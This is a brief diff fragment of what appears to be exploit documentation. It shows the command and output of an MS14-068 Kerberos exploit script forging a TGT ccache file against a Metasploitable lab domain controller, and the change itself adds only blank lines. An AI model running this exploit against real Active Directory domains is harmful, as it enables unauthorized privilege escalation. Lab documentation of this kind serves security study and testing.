@@ -29,3 +29,5 @@ $ python ms14-068.py -u user01@metasploitable.local -d msfdc01.metasploitable.lo
   [+] Parsing TGS-REP from msfdc01.metasploitable.local... Done!
   [+] Creating ccache file 'TGT_user01@metasploitable.local.ccache'... Done!
 ```
+
+
